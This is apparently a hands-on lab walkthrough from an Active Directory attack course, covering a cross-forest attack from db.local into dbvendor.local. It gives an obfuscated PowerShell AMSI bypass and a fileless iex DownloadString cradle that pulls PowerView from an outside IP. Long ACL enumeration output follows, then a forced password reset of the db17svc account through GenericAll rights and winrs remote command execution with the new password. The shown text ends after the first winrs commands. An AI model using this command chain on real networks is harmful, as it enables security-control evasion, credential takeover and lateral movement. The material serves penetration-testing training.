# Hands-On 27:

```
Using the reverse shell on db.local:
- Execute cross forest attack on dbvendor.local by abusing ACLs
- Enumerate FSPs for db.local and escalate privileges to DA by compromising the FSPs.
```

## Index of content
  1. [Cross forest attack](#cross-forest-attack)
  2. [Privilege escalation](#privilege-escalation)

## Cross forest attack

Bypass amsi on revere shell:
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' )-VaL)."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ))."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
```
Download PowerView from target machine fileless and validate the trust fores :

```
PS C:\Windows\system32> iex (New-Object Net.Webclient).DownloadString("http://192.168.100.17/PowerView.ps1")
PS C:\Windows\system32> Get-ForestTrust


TopLevelNames            : {dbvendor.local}
ExcludedTopLevelNames    : {}
TrustedDomainInformation : {dbvendor.local}
SourceName               : db.local
TargetName               : dbvendor.local
TrustType                : Forest
TrustDirection           : Bidirectional
```
Find instersting ACls with powerview on the trust domain:

```
PS C:\Windows\system32> Find-InterestingDomainAcl -ResolveGUIDs -Domain dbvendor.local


ObjectDN                : DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
IdentityReferenceClass  : group

ObjectDN                : DC=@,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
IdentityReferenceClass  : group

ObjectDN                : DC=A.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
IdentityReferenceClass  : group

ObjectDN                : DC=B.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
IdentityReferenceClass  : group

ObjectDN                : DC=C.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
IdentityReferenceClass  : group

ObjectDN                : DC=D.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
IdentityReferenceClass  : group

ObjectDN                : DC=E.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
IdentityReferenceClass  : group

ObjectDN                : DC=F.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
IdentityReferenceClass  : group

ObjectDN                : DC=G.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
IdentityReferenceClass  : group

ObjectDN                : DC=H.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
IdentityReferenceClass  : group

ObjectDN                : DC=I.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
IdentityReferenceClass  : group

ObjectDN                : DC=J.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
IdentityReferenceClass  : group

ObjectDN                : DC=K.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
IdentityReferenceClass  : group

ObjectDN                : DC=L.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
IdentityReferenceClass  : group

ObjectDN                : DC=M.ROOT-SERVERS.NET,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete,
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1101
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=dbvendor,DC=local
IdentityReferenceClass  : group

ObjectDN                : CN=DFSR-LocalSettings,CN=DBVENDOR-DC,OU=Domain Controllers,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : All
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1000
IdentityReferenceName   : DBVENDOR-DC$
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DBVENDOR-DC,OU=Domain Controllers,DC=dbvendor,DC=local
IdentityReferenceClass  : computer

ObjectDN                : CN=Domain System Volume,CN=DFSR-LocalSettings,CN=DBVENDOR-DC,OU=Domain
                          Controllers,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : All
AceFlags                : Inherited
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1000
IdentityReferenceName   : DBVENDOR-DC$
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DBVENDOR-DC,OU=Domain Controllers,DC=dbvendor,DC=local
IdentityReferenceClass  : computer

ObjectDN                : CN=SYSVOL Subscription,CN=Domain System
                          Volume,CN=DFSR-LocalSettings,CN=DBVENDOR-DC,OU=Domain Controllers,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : All
AceFlags                : Inherited
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-569087967-1859921580-1949641513-1000
IdentityReferenceName   : DBVENDOR-DC$
IdentityReferenceDomain : dbvendor.local
IdentityReferenceDN     : CN=DBVENDOR-DC,OU=Domain Controllers,DC=dbvendor,DC=local
IdentityReferenceClass  : computer

ObjectDN                : CN=db11svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db12svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db13svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db14svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db15svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db16svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db17svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db18svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db19svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db20svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db21svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db22svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db23svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db24svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db25svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db26svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db27svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db28svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db29svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db30svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

ObjectDN                : CN=db1svc,CN=Users,DC=dbvendor,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2781415573-3701854478-2406986946-1105
IdentityReferenceName   : srvdba
IdentityReferenceDomain : db.local
IdentityReferenceDN     : CN=srvdba,CN=Users,DC=db,DC=local
IdentityReferenceClass  : user

```
Reviewing the ACls it's possible with Generic all eprmissions Reset the Password of dbxsvc

```
Set-DomainUserPassword -Identity db17svc -AccountPassword (ConvertTo-SecureString 'Password@123' -AsPlainText -Force) -Domain dbvendor.local -Verbose```
```
## Privilege escalation
```
PS C:\Windows\system32> winrs -r:db-dc.db.local -u:dbvendor\db17svc -p:Password@123 "whoami"
dbvendor\db17svc
PS C:\Windows\system32> winrs -r:db-dc.db.local -u:dbvendor\db17svc -p:Password@123 "whoami;hostname;ipconfig"
```
